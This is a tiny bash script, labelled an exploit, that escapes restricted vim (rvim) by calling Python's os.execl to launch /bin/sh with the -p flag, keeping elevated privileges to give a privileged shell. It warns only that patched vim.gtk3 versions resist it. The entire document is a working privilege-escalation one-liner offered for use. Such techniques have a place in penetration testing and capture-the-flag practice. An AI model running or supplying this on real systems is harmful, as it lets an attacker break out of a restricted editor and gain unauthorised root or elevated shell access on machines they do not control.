#!/bin/bash

echo -e "\nThis exploit will not work in upgraded version of vim.gtk3\n"

rvim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'


